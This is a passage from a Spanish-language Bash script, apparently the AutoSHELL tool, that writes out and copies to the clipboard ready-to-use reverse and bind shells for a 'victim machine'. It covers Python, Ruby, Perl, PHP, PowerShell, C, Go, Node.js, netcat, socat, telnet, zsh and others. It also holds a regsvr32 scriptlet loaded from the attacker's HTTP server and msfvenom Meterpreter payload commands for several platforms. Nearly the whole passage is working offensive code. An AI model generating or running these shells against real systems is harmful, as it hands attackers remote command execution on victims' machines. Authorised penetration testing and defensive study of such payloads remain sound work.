	echo -e "\n\tpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$puerto));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        python_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        socat_esc
	codificar
}
python-win_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "#Shell generada con AutoSHELL de russkkov"				 > autoshell-win.py
	echo -e "import os,socket,subprocess,threading;"				>> autoshell-win.py
	echo -e "def s2p(s, p):"							>> autoshell-win.py
	echo -e "\twhile True:"								>> autoshell-win.py
	echo -e "\t\tdata = s.recv(1024)"						>> autoshell-win.py
	echo -e "\t\tif len(data) > 0:"							>> autoshell-win.py
	echo -e "\t\t\tp.stdin.write(data)"						>> autoshell-win.py
	echo -e "\t\t\tp.stdin.flush()"							>> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "def p2s(s, p):"							>> autoshell-win.py
	echo -e "\twhile True:"								>> autoshell-win.py
	echo -e "\t\ts.send(p.stdout.read(1))"						>> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"			>> autoshell-win.py
	echo -e "s.connect((\"$ip\",$puerto))"						>> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "p=subprocess.Popen([\"\\\windows\\\system32\\\cmd.exe\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)" >> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "s2p_thread = threading.Thread(target=s2p, args=[s, p])"		>> autoshell-win.py
	echo -e "s2p_thread.daemon = True"						>> autoshell-win.py
	echo -e "s2p_thread.start()"							>> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "p2s_thread = threading.Thread(target=p2s, args=[s, p])"		>> autoshell-win.py
	echo -e "p2s_thread.daemon = True"						>> autoshell-win.py
	echo -e "p2s_thread.start()"							>> autoshell-win.py
	echo -e ""									>> autoshell-win.py
	echo -e "try:"									>> autoshell-win.py
	echo -e "\tp.wait()"								>> autoshell-win.py
	echo -e "except KeyboardInterrupt:"						>> autoshell-win.py
	echo -e "\ts.close()"								>> autoshell-win.py
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell-win.py en la ruta actual con el código de la reverse shell en Python.\n"${NC}
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n\n"${NC}
        nc_esc
	codigo_cod="$(cat autoshell-win.py)"
	codificar
}
#ruby
regsvr32-win_reverse(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "<?XML version=\"1.0\"?>"						 > autoshell_regsvr32.sct
	echo -e "<!-- Shell generada con AutoSHELL de russkkov-->"			>> autoshell_regsvr32.sct
	echo -e "<scriptlet>"								>> autoshell_regsvr32.sct
	echo -e "<registration "							>> autoshell_regsvr32.sct
	echo -e "\tprogid=\"PoC\""							>> autoshell_regsvr32.sct
	echo -e "\tclassid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" >"		>> autoshell_regsvr32.sct
	echo -e "\t<script language=\"JScript\">"					>> autoshell_regsvr32.sct
	echo -e "\t\t<![CDATA["								>> autoshell_regsvr32.sct
	echo -e "\t\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe\");"	>> autoshell_regsvr32.sct
	echo -e "\t\t]]>"								>> autoshell_regsvr32.sct
	echo -e "</script>"								>> autoshell_regsvr32.sct
	echo -e "</registration>"							>> autoshell_regsvr32.sct
	echo -e "</scriptlet>"								>> autoshell_regsvr32.sct
	echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell_regsvr32.sct en la ruta actual con el código de la reverse shell.\n"${NC}
        echo -e ${LG}"[+] Código para compartir servicio HTTP en la máquina atacante:\n\n"${NC}
	echo -e ${YELLOW} "python3 -m http.server 8002\n\n"
	echo -e ${LG}"[+] Código para cargar el archivo autoshell_regsvr32.sct en la máquina víctima:\n"${NC}
        echo -e ${YELLOW}
        echo -e "\tregsvr32 /u /n /s /i:http://$ip:8002/autoshell_regsvr32.sct scrobj.dll" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        rm codigo.tmp
}
#ruby
ruby_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\truby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$ip\",$puerto))'" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
	codificar
}

#rustcat
rustcat_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\trcat $ip $puerto -r bash" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
	codificar
}
#socat
socat_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$puerto" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        socat_esc
	codificar
}
#telnet
telnet_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmknod a p && telnet $ip $puerto 0<a | /bin/sh 1>a" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
	codificar
}
#zsh
zsh_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tzsh -c 'zmodload zsh/net/tcp && ztcp $ip $puerto && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
	codificar
}
###########################################
#-----------[ Funciones bind ]------------#
###########################################
python_bind(){
	url_install
        echo -e ${LG}"\n[+] El código de la bind reverse shell en la máquina víctima es:\n"
        echo -e ${YELLOW}
	echo -e "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(($ip,$puerto));s1.listen(1);c,a=s1.accept();" > autoshell_bind.py
	echo -e "while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'" >> autoshell_bind.py
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell_bind.py en la ruta actual con el código de la bind reverse shell\n\n"${NC}
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        python_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        socat_esc
	codigo_cod="$(cat autoshell_bind.py)"
	codificar
}
###########################################
#--------[ Funciones meterpreter ]--------#
###########################################
android_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R -o autoshell_android.apk\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
bash_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$puerto -f raw -o autoshell_bash.sh\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
jsp_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$puerto -f raw -o autoshell_jsp.jsp\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
linux_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto -f elf -o autoshell_liinux.elf\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
macos_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p osx/x64/shell_reverse_tcp LHOST=$ip LPORT=$puerto -f macho -o autoshell_macos.macho\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
php_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p php/reverse_php LHOST=$ip LPORT=$puerto -o autoshell_php.php\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
war_meter(){
	xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p java/jsp_shell_reverse_tcp lhost=$ip lport=$puerto -f war -o shell.war\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        socat_esc
}
windows_meter(){
        xclip_install
        echo -e ${LG}"\n[+] El código de la meterpreter shell en la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$puerto -f exe -o autoshell_windows.exe\n" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
}
###########################################
#----------------[ Info ]-----------------#
###########################################
awk_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\tawk  'BEGIN {s=\"/inet/tcp/0/127.0.0.1/8080\";while(42){do{printf \"> \"|&s;s|&getline c;if(c){while((c|&getline)>0)print \$0|&s;close(c);}}while(c!=\"exit\")close(s);}}' /dev/null\n"${NC}
}
bash_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\tbash -c 'exec bash -i &>/dev/tcp/127.0.0.1/8080 <&1'\n"${NC}
}
c_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}
        echo -e "#include <stdio.h>"                                 
        echo -e "#include <sys/socket.h>"                            
        echo -e "#include <sys/types.h>"                             
        echo -e "#include <stdlib.h>"                                
        echo -e "#include <unistd.h>"                                
        echo -e "#include <netinet/in.h>"                            
        echo -e "#include <arpa/inet.h>"                             
        echo -e ""                                                   
        echo -e "int main(void){"                                    
        echo -e "\tint port = 8080;"                              
        echo -e "\tstruct sockaddr_in revsockaddr;"                  
        echo -e ""                                                   
        echo -e "\tint sockt = socket(AF_INET, SOCK_STREAM, 0);"     
        echo -e "\trevsockaddr.sin_family = AF_INET;"                
        echo -e "\trevsockaddr.sin_port = htons(port);"              
        echo -e "\trevsockaddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");"
        echo -e ""                                                  
        echo -e "\tconnect(sockt, (struct sockaddr *) &revsockaddr,"
        echo -e "\tsizeof(revsockaddr));"                  
        echo -e "\tdup2(sockt, 0);"                        
        echo -e "\tdup2(sockt, 1);"                        
        echo -e "\tdup2(sockt, 2);"                        
        echo -e ""                                         
        echo -e "\tchar * const argv[] = {\"bash\", NULL};"
        echo -e "\texecve(\"/bin/sh\", argv, NULL);"
        echo -e ""        
        echo -e "\treturn 0;"
        echo -e "}\n"${NC}
}
dart_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\timport 'dart:io';"                                             
        echo -e "\timport 'dart:convert';"                                        
        echo -e "\t"                                                              
        echo -e "\tmain() {"                                                      
        echo -e "\t\tSocket.connect(\"127.0.0.1\", 8080).then((socket) {"            
        echo -e "\t\t\tsocket.listen((data) {"                                    
        echo -e "\t\t\t\tProcess.start('/bin/bash', []).then((Process process) {" 
        echo -e "\t\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());" 
        echo -e "\t\t\t\t\tprocess.stdout"                                        
        echo -e "\t\t\t\t\t.transform(utf8.decoder)"                              
        echo -e "\t\t\t\t\t.listen((output) { socket.write(output); });"          
        echo -e "\t\t\t\t});"                                                     
        echo -e "\t\t\t},"                                                        
        echo -e "\t\t\tonDone: () {"                                              
        echo -e "\t\t\t\tsocket.destroy();"                                       
        echo -e "\t\t\t});"                                                       
        echo -e "\t\t});"                                                         
        echo -e "\t}\n"${NC}
}
gawk_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\tgawk 'BEGIN {P=8080;S=\"> \";H=\"127.0.0.1\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'\n"${NC}
}
golang_info(){
	echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"127.0.0.1:8080\");cmd:=exec.Command(\"bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n"${NC}
}
golang-win_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\tpackage main"                                                  
        echo -e "\timport ("                                                      
        echo -e "\t\t\"bufio\""                                                   
        echo -e "\t\t\"net\""                                                     
        echo -e "\t\t\"os/exec\""                                                 
        echo -e "\t\t\"syscall\""                                                 
        echo -e "\t\t\"time\""                                                    
        echo -e "\t)"                                                             
        echo -e "\t"                                                              
        echo -e "\tfunc main() {"                                                 
        echo -e "\t\treverse(\"127.0.0.1:8080\")"                                    
        echo -e "\t}"                                                             
        echo -e "\t"                                                              
        echo -e "\tfunc reverse(host string) {"                                   
        echo -e "\t\tc, err := net.Dial(\"tcp\", host)"                           
        echo -e "\t\tif nil != err {"                                             
        echo -e "\t\t\tif nil != c {"                                             
        echo -e "\t\t\t\tc.Close()"                                               
        echo -e "\t\t\t}"                                                         
        echo -e "\t\t\ttime.Sleep(time.Minute)"                                   
        echo -e "\t\t\treverse(host)"                                             
        echo -e "\t\t}"                                                           
        echo -e "\t\tr := bufio.NewReader(c)"                                     
        echo -e "\t\tfor {"                                                       
        echo -e "\t\t\torder, err := r.ReadString('\\\n')"                        
        echo -e "\t\t\tif nil != err {"                                           
        echo -e "\t\t\t\tc.Close()"                                               
        echo -e "\t\t\t\treverse(host)"                                           
        echo -e "\t\t\t\treturn"                                                  
        echo -e "\t\t\t}"                                                         
        echo -e "\t\t\tcmd := exec.Command(\"cmd\", \"/C\", order)"               
        echo -e "\t\t\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}"  
        echo -e "\t\t\tout, _ := cmd.CombinedOutput()"                            
        echo -e "\t\t\tc.Write(out)"                                              
        echo -e "\t\t}"                                                           
        echo -e "\t}\n"${NC}
}
java_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\timport java.io.BufferedReader;"                                        
        echo -e "\timport java.io.InputStreamReader;"                                     
        echo -e "\tpublic class shell {"                                                  
        echo -e "\t\tpublic static void main(String args[]) {"                            
        echo -e "\t\t\tString s;"                                                         
        echo -e "\t\t\tProcess p;"                                                        
        echo -e "\t\t\ttry {"                                                             
        echo -e "\t\t\t\tp = Runtime.getRuntime().exec(\"bash -c \$@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/8080 0>&1\");"        
        echo -e "\t\t\t\tp.waitFor();"                                                    
        echo -e "\t\t\t\tp.destroy();"                                                    
        echo -e "\t\t\t} catch (Exception e) {}"                                          
        echo -e "\t\t}"                                                                   
        echo -e "\t}\n"${NC} 
}
lua_info(){
	echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\tlua5.1 -e 'local host, port = \"127.0.0.1\", 8080 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n"${NC}
}
nc_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\trm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f\n"${NC}
}
nc-win_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\tnc.exe -e cmd.exe 127.0.0.1 8080\n"${NC}
}
ncat_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\tncat 127.0.0.1 8080 -e /bin/bash\n"${NC}
}
nodejs_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\t(function(){"                                          
        echo -e "\t\tvar net = require(\"net\"),"                         
        echo -e "\t\tcp = require(\"child_process\"),"                    
        echo -e "\t\tsh = cp.spawn(\"/bin/sh\", []);"                     
        echo -e "\t\tvar client = new net.Socket();"                      
        echo -e "\t\tclient.connect(8080, \"127.0.0.1\", function(){"        
        echo -e "\t\t\tclient.pipe(sh.stdin);"                            
        echo -e "\t\t\tsh.stdout.pipe(client);"                           
        echo -e "\t\t\tsh.stderr.pipe(client);"                           
        echo -e "\t\t});"                                                 
        echo -e "\t\treturn /a/;"                                         
        echo -e "\t})();\n"${NC}
}
perl_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\tperl -e 'use Socket;\$i=\"127.0.0.1\";\$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"${NC}
}
perl-win_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"use IO::Socket;"                               
        echo -e "\$ip=\"$ip\";"                                 
        echo -e "\$puerto=\"$puerto\";"                         
        echo -e "conectar(\$ip,\$puerto);"                      
        echo -e "tipo();"                                       
        echo -e "sub conectar {"                                                 
        echo -e "\tsocket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname('tcp'));"
        echo -e "\tconnect(REVERSE, sockaddr_in(\$puerto,inet_aton(\$ip)));"     
        echo -e "\topen (STDIN,\">&REVERSE\");"                                  
        echo -e "\topen (STDOUT,\">&REVERSE\");"                                 
        echo -e "\topen (STDERR,\">&REVERSE\");"                                 
        echo -e "}"                                                              
        echo -e "sub tipo {"                                                     
        echo -e "\tif ($^O =~/Win32/ig) {"                                       
        echo -e "\t\tsystem(\"cmd.exe\");"                                       
        echo -e "\t} else {"                                                     
        echo -e "\t\tsystem(\"bin/bash\");"                                      
        echo -e "\t}"                                                            
        echo -e "}\n" ${NC}
}
php_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/127.0.0.1/8080 0>&1'\");?>\n"${NC}
}
powershell_info(){
	echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\tpowershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\n"${NC}
}
python_info(){
	echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\tpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n"${NC}
}
python-win_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\timport os,socket,subprocess,threading;"                                
        echo -e "\tdef s2p(s, p):"                                                        
        echo -e "\t\twhile True:"                                                         
        echo -e "\t\t\tdata = s.recv(1024)"                                               
        echo -e "\t\t\tif len(data) > 0:"                                                 
        echo -e "\t\t\t\tp.stdin.write(data)"                                             
        echo -e "\t\t\t\tp.stdin.flush()"                                                 
        echo -e "\t"                                                                      
        echo -e "\tdef p2s(s, p):"                                                        
        echo -e "\t\twhile True:"                                                         
        echo -e "\t\t\ts.send(p.stdout.read(1))"                                          
        echo -e "\t"                                                                      
        echo -e "\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"                    
        echo -e "\ts.connect((\"127.0.0.1\",8080))"                                          
        echo -e "\t"                                                                      
        echo -e "\tp=subprocess.Popen([\"\\\windows\\\system32\\\cmd.exe\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)" 
        echo -e "\t"                                                                      
        echo -e "\ts2p_thread = threading.Thread(target=s2p, args=[s, p])"                
        echo -e "\ts2p_thread.daemon = True"                                              
        echo -e "\ts2p_thread.start()"                                                    
        echo -e "\t"                                                                      
        echo -e "\tp2s_thread = threading.Thread(target=p2s, args=[s, p])"                
        echo -e "\tp2s_thread.daemon = True"                                              
        echo -e "\tp2s_thread.start()"                                                    
        echo -e "\t"                                                                      
        echo -e "\ttry:"                                                                  
        echo -e "\t\tp.wait()"                                                            
        echo -e "\texcept KeyboardInterrupt:"                                             
        echo -e "\t\ts.close()\n"${NC}
}
regsvr32-win_info(){
        echo -e ${LG}"\n[+] El código de la shell en $tipo:\n"
        echo -e ${YELLOW}
        echo -e "\t<?XML version=\"1.0\"?>"                      
        echo -e "\t<scriptlet>"                                                           
        echo -e "\t<registration "                                                        
        echo -e "\t\tprogid=\"PoC\""                                                      
        echo -e "\t\tclassid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" >"                
        echo -e "\t\t<script language=\"JScript\">"                                       
        echo -e "\t\t\t<![CDATA["                                                         
        echo -e "\t\t\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe\");"  
        echo -e "\t\t\t]]>"                                                               
        echo -e "\t</script>"                                                             
        echo -e "\t</registration>"                                                       
        echo -e "\t</scriptlet>\n\n"
        echo -e ${LG}"[+] Código para compartir servicio HTTP en la máquina atacante:\n\n"${NC}
        echo -e ${YELLOW} "python3 -m http.server 8080\n\n"
        echo -e ${LG}"[+] Código para cargar el archivo autoshell_regsvr32.sct en la máquina víctima:\n"${NC}
        echo -e ${YELLOW}
        echo -e "\tregsvr32 /u /n /s /i:http://127.0.0.1:8080/nombre_shell_regsvr32.sct scrobj.dll"
}
ruby_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
	echo -e ${DG}"\n\truby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$ip\",$puerto))'\n"${NC}
}
rustcat_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\trrcat 127.0.0.1 8080 -r bash\n"${NC}
}
socat_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\tsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080\n"${NC}
}
telnet_info(){
        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\tmknod a p && telnet 127.0.0.1 8080 0<a | /bin/sh 1>a\n"${NC}
}
zsh_info(){
